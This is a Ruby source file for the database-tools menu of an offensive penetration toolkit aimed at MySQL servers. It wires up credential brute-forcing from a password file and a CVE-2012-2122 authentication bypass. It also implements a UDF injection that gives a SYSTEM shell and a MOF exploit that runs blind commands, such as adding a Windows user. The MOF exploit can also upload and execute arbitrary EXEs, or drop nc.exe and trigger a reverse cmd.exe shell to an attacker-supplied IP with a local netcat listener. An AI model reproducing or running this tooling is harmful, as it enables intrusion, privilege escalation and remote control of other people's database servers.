# Database Tools User Interface

# Database Tools Help Menu
def dbtools_usage
  puts "Available Options for Database Tools Menu: ".underline.white
  puts "back ".light_yellow + "        => ".white + "Return to Main Menu".light_red
#  puts "mssqlc ".light_yellow + "      => ".white + "MS-SQL Client".light_red
#  puts "mssql_login ".light_yellow + " => ".white + "MS-SQL Login Bruter".light_red
  puts "mysql-fu ".light_yellow + "    => ".white + "MySQL-Fu Client Tool".light_red
  puts "mysql_check ".light_yellow + " => ".white + "MySQL Credential Check".light_red
  puts "mysql_login ".light_yellow + " => ".white + "MySQL Login".light_red
  puts "auth_bypass ".light_yellow + " => ".white + "MySQL Auth Bypass Exploit (CVE-2012-2122)".light_red
  puts "mysql_mof ".light_yellow + "   => ".white + "Windows MySQL Privileged User to SYSTEM MOF Exploit".light_red
  puts "mysql_udf ".light_yellow + "   => ".white + "Windows MySQL Privileged User to SYSTEM UDF Exploit".light_red
  print_line("")
end

# Database Tools Menu
def dbtools_menu
  puts
  prompt = "(dbT00ls)> "
  while line = Readline.readline("#{prompt}", true)
    cmd = line.chomp
    case cmd
    when /^c$|^clear$|^cls$/i
      cls
      banner
      dbtools_menu
    when /^h$|^help$|^ls$/i
      puts
      dbtools_usage
      dbtools_menu
    when /^exit$|^quit$|^back$/i
      puts
      print_error("Returning to Main Menu....")
      main_menu
    when /^!(.+)/
      cmd=$1.strip.chomp
      res = commandz(cmd)
      print_line("\n#{res.join().chomp}")
      dbtools_menu
    when /^local$|^OS$/i
      local_shell
      dbtools_menu
    when /^config$/i
      print_status("Current Configuration: ")
      pp $config
      dbtools_menu
    when /^ip$/i
      ip_info
      dbtools_menu
    when /^ip2host$|^host2ip$/i
      host = Readline.readline("   Target IP or Domain: ", true)
      dnsenum = DNSEnum.new(host.strip.chomp)
      ip, domain, hostname = dnsenum.host_info
      puts
      print_status("IP: #{ip}")
      print_status("Domain: #{domain}") unless domain == ip
      print_status("Hostname: #{hostname}\n\n")
      dbtools_menu
    when /^mysqlfu|^mysql-fu|^mysqlc|^mysql.connect|^mycon/i
      print_line("")
      target = Readline.readline("(Target IP)> ", true)
      print_caution("Use Standard Port 3306 (Y/N)?")
      answer=gets.chomp
      if answer.upcase == 'Y' or answer.upcase == 'YES'
        port=3306
      else
        p = Readline.readline("(Port)> ", true)
        port=p.chomp.to_i
      end
      user = Readline.readline("(Username)> ", true)
      pass = Readline.readline("(Password)> ", true)
      print_caution("Define Database for Connection (Y/N)?")
      answer=gets.chomp
      if answer.upcase == 'Y' or answer.upcase == 'YES'
        d = Readline.readline("(Database Name)> ", true)
        db=d.chomp
      else
        db=nil
      end
      mysql_connection = MySQLc.new(target.chomp, port.to_i, user.chomp, pass.chomp, db)
      if mysql_connection.connected?
        print_good("w00t - we're connected!")
        mysql_connection.get_basics
        print_caution("Type 'HELP' to see list of available options")
        print_caution("Type 'QUIT' or 'EXIT' to disconnect")
        print_line("")
        mysql_connection.mysqlfu_shell
      end
      print_line("")
      dbtools_menu
    when /^mysql.check|^mycheck/i
      print_line("")
      dbtools = DBTools.new()
      target = Readline.readline("(Target IP)> ", true)
      print_caution("Use Standard Port 3306 (Y/N)?")
      answer=gets.chomp
      if answer.upcase == 'Y' or answer.upcase == 'YES'
        port=3306
      else
        p = Readline.readline("(Port)> ", true)
        port=p.chomp.to_i
      end
      user = Readline.readline("(Username)> ", true)
      pass = Readline.readline("(Password)> ", true)
      print_caution("Define Database for Connection (Y/N)?")
      answer=gets.chomp
      if answer.upcase == 'Y' or answer.upcase == 'YES'
        d = Readline.readline("(Database Name)> ", true)
        db=d.chomp
      else
        db=nil
      end
      db_connection = dbtools.mysql_can_we_connect(host, port.to_i, user, pass, db)
      if not db_connection.nil?
        print_line("")
        print_good("w00t - Successfully Authenticated!")
        print_good("Host: #{@host}:#{@port}")
        print_good("User: #{@user}")
        print_good("Pass: #{@pass}")
        print_good("DB: #{@db}") unless @db.nil?
      end
      print_line("")
      dbtools_menu
    when /^mysql.login|^mylogin/i
      print_line("")
      dbtools = DBTools.new()
      target = Readline.readline("(Target IP)> ", true)
      print_caution("Use Standard Port 3306 (Y/N)?")
      answer=gets.chomp
      if answer.upcase == 'Y' or answer.upcase == 'YES'
        port=3306
      else
        p = Readline.readline("(Port)> ", true)
        port=p.chomp.to_i
      end
      user = Readline.readline("(Username)> ", true)
      pfile = Readline.readline("(Passwords File)> ", true)
      if File.exists?(pfile.strip.chomp)
        passwords = File.open(pfile.strip.chomp).readlines
        print_line("")
        dbtools.mysql_login_check(target.chomp, port.to_i, user.chomp, passwords, nil)
      else
        print_line("")
        print_error("Unable to load password file!")
        print_error("Please check path or permissions and try again.....")
      end
      dbtools_menu
    when /^auth.bypass|^mysql.bypass/i
      print_line("")
      dbtools = DBTools.new()
      target = Readline.readline("(Target IP)> ", true)
      print_caution("Use Standard Port 3306 (Y/N)?")
      answer=gets.chomp
      if answer.upcase != 'Y' or answer.upcase != 'YES'
        port = Readline.readline("(Port)> ", true)
      else
        port=3306
      end
      user = Readline.readline("(Username)> ", true)
      dbtools.mysql_auth_bypass(target, port.to_i, user)
      print_line("")
      dbtools_menu
    when /^mysql.udf$|^myudf$|^udf$/i
      print_line("")
      target = Readline.readline("(Target IP)> ", true)
      print_caution("Use Standard Port 3306 (Y/N)?")
      answer=gets.chomp
      if answer.upcase == 'Y' or answer.upcase == 'YES'
        port=3306
      else
        p = Readline.readline("(Port)> ", true)
        port=p.chomp.to_i
      end
      user = Readline.readline("(Username)> ", true)
      pass = Readline.readline("(Password)> ", true)
      print_caution("Define Database for Connection (Y/N)?")
      answer=gets.chomp
      if answer.upcase == 'Y' or answer.upcase == 'YES'
        d = Readline.readline("(Database Name)> ", true)
        db=d.chomp
      else
        db=nil
      end
      mysql_connection = MySQLc.new(target.chomp, port.to_i, user.chomp, pass.chomp, db)
      if mysql_connection.connected?
        if mysql_connection.is_windows?
          # Check if sys_exec() already exists
          if not mysql_connection.sys_exec_check
            exists = false
          else
            print_caution("Appears the 'sys_exec()' function already exists!")
            exists = true
          end
          if exists
            mysql_connection.udf_sys_shell
          else
            # Create or re-create the sys_exec() function
            udf_dest = mysql_connection.create_sys_functions
            if not udf_dest.nil?
              print_good("Appears UDF Injection was a success!")
              print_good("UDF Functions sys_exec() & sys_eval() created and linked to: #{udf_dest}")
              print_status("Dropping to pseduo shell so you can do your thing.....")
              puts "Type '".light_yellow + "EXIT".white + "' or '".light_yellow + "QUIT".white + "' to close and exit the pseudo shell session".light_yellow + "....".white
              puts "\n\n"
              mysql_connection.udf_sys_shell
              puts
              puts "Got SYSTEM".light_green + "?".white
              puts
              print_caution("To Remove delete the linked DLL and DROP the MySQL Functions: ")
              print_caution("inked DLL: #{udf_dest}")
              print_caution("SQL: ")
              print_line("    DROP FUNCTION sys_exec;")
              print_line("    DROP FUNCTION sys_eval;\n")
            end
          end
        else
          print_error("Target doesn't appear to be running Windows!")
          print_error("THIS Exploit is not meant for any other type of target, sorry....\n")
        end
      end
      dbtools_menu
    when /^mysql.mof$|^mymof$|^mof$/i
      print_line("")
      target = Readline.readline("(Target IP)> ", true)
      print_caution("Use Standard Port 3306 (Y/N)?")
      answer=gets.chomp
      if answer.upcase == 'Y' or answer.upcase == 'YES'
        port=3306
      else
        p = Readline.readline("(Port)> ", true)
        port=p.chomp.to_i
      end
      user = Readline.readline("(Username)> ", true)
      pass = Readline.readline("(Password)> ", true)
      print_caution("Define Database for Connection (Y/N)?")
      answer=gets.chomp
      if answer.upcase == 'Y' or answer.upcase == 'YES'
        d = Readline.readline("(Database Name)> ", true)
        db=d.chomp
      else
        db=nil
      end
      mysql_connection = MySQLc.new(target.chomp, port.to_i, user.chomp, pass.chomp, db)
      if mysql_connection.connected?
        if mysql_connection.is_windows?
          drive = mysql_connection.get_drive
          if drive.nil?
            print_error("Sorry, Unable to continue wihtout drive...")
            dbtools_menu
          end
          print_status("Example Path: \"C:\\\\TEMP\\\\\"")
          remote_path = Readline.readline("Provide Destination Path to use for Uploads:  ", true)
          puts
          while(true)
            print_caution("MOF Usage Options:")
            print_caution("0) Return to Database Tools Menu")
            print_caution("1) Run Blind System Command as Payload")
            print_caution("2) Upload & Execute Custom EXE")
            print_caution("3) Upload NetCat & Run Reverse Command Shell\n")
            mof_option = Readline.readline("Enter Option Number:  ", true)
           if mof_option.to_i >= 0 and mof_option.to_i <= 3
             case mof_option.to_i
             when 0
               puts
               print_error("OK, returning to Database Tools Menu...\n")
               break
             when 1
               puts
               print_status("Example Command: NET USER NOOB P@ssw0rd1 /ADD")
               mof_cmd_opt = Readline.readline("Enter Command to Run:  ", true)
               puts
               mof_name = randz(5) + ".mof"
               mof_dest = "#{drive}:\\\\\\windows\\\\\\system32\\\\wbem\\\\mof\\\\#{mof_name}"
               print_status("Attempting to Execute Blind Command.....")
               print_status("MOF: #{mof_dest}")
               print_status("CMD: #{mof_cmd_opt.strip.chomp}")
               payload = Payloads.new()
               mof = payload.generate_cmd_mof(mof_cmd_opt.strip.chomp)
               mysql_connection.write_mof_file(mof, mof_dest)
               print_status("Returning to MOF Menu...\n\n")
             when 2
               puts
               mof_localbin = Readline.readline("Path to Local EXE to Upload & Execute:  ", true)
               if File.exists?(mof_localbin.strip.chomp)
                 exe_name = randz(15) + ".exe"
                 mof_name = randz(5) + ".mof"
                 exe_dest = "#{drive}:\\\\windows\\\\system32\\\\#{exe_name}"
                 mof_dest = "#{drive}:\\\\\\windows\\\\\\system32\\\\wbem\\\\mof\\\\#{mof_name}"
                 # Now we read our local binary payload into a var so we can re-write to remote server
                 data = "0x" + File.open(mof_localbin.strip.chomp, 'rb').read.unpack('H*').first
                 print_status("Uploading Payload File '#{mof_localbin.strip.chomp}' to '#{exe_dest}'")
                 print_status("If you're expecting a shell, make sure your listener is ready......")
                 sleep(3)
                 if mysql_connection.custom_silent_sql("SELECT #{data} INTO DUMPFILE '#{exe_dest}'")
                   print_good("Appears things were a success!")
                 else
                   print_error("Problem writing payload to file!")
                 end
               end
               # Upload our MOF file which will run our payload we just dropped
               print_status("Uploading MOF which will wait for our payload....")
               payload = Payloads.new()
               mof = payload.generate_exe_mof(mof_name, exe_name)
               mysql_connection.write_mof_file(mof, mof_dest)
               print_status("Returning to MOF Menu...\n\n")
             when 3
               puts
               mof_revip = Readline.readline("Reverse Shell IP:  ", true)
               mof_revport = Readline.readline("Reverse Shell Port:  ", true)
               mof_name = randz(5) + ".mof"
               exe_name = randz(15) + ".exe"
               exe_dest = "#{drive}:\\\\\\windows\\\\\\system32\\\\#{exe_name}"
               mof_dest = "#{drive}:\\\\\\windows\\\\\\system32\\\\wbem\\\\mof\\\\#{mof_name}"
               revshell = "#{exe_name} #{mof_revip.strip.chomp} #{mof_revport.strip.chomp.to_i} -e cmd.exe"
               listener = "xterm -title 'NC Listener' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c 'nc -lvp #{mof_revport.strip.chomp.to_i}'\""

               print_status("Uploading NetCat (nc.exe) file '#{HOME}extras/mymof/payloads/nc.exe' to '#{exe_dest}\\\\#{exe_name}'")
               if mysql_connection.mof_write_bin_file("#{HOME}extras/mymof/payloads/nc.exe", exe_dest)
                 print_status("Launching listener in new window.....")
                 fireNforget(listener)
                 sleep(3)
                 print_status("Triggering Reverse Shell to '#{mof_revip.strip.chomp}' on port '#{mof_revport.strip.chomp}'.....")
                 payload = Payloads.new()
                 mof = payload.generate_cmd_mof(revshell)
                 mysql_connection.write_mof_file(mof, mof_dest)
                 puts "WARNING".light_red + ": ".white + "#{exe_dest} (NetCat) remains on system & is suggested you remove when done".light_yellow + "....".white
               end
               print_status("Returning to MOF Menu...\n\n")
             end
           else
             puts
             print_error("Oops, Didn't quite understand that one!")
             print_error("Please select a valid option from menu below...\n\n")
           end
         end
        else
          print_error("Target doesn't appear to be running Windows!")
          print_error("THIS Exploit is not meant for any other type of target, sorry....\n")
        end
      end
      dbtools_menu
    else
      puts
      print_error("Oops, Didn't quite understand that one!")
      print_error("Please try again...\n\n")
      dbtools_menu
    end
  end
end
